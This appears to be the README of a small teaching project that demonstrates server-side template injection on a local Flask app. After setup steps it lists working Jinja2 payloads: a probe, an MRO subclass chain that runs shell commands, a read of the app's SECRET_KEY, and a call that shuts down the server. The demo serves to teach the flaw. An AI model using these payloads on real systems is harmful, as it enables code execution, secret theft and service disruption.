# Flask SSTI demo
Small project that demonstrates SSTI attack on the Flask framework.

## How to run

Create virtual env and install Flask:
```
$ python3 -m venv env
$ source env/bin/activate
$ pip3 install flask flask-wtf
```

Run the app and go to ```http://localhost:5000```
```
$ python3 main.py
```

## Attacks

- Check if it's possible to execute SSTI attack. Result should be 49, not '{{ 7 * 7 }}'
```
{{ 7 * 7 }}
```
- Use MRO to run RCE
```
{{''.__class__.__mro__[1].__subclasses__()[405]('ls', shell=True, stdout=-1).communicate()}}
```
- Get SECRET_KEY
```
{{ config['SECRET_KEY'] }}
```
- Shut down the server
```
{{ request.environ['werkzeug.server.shutdown']() }}
```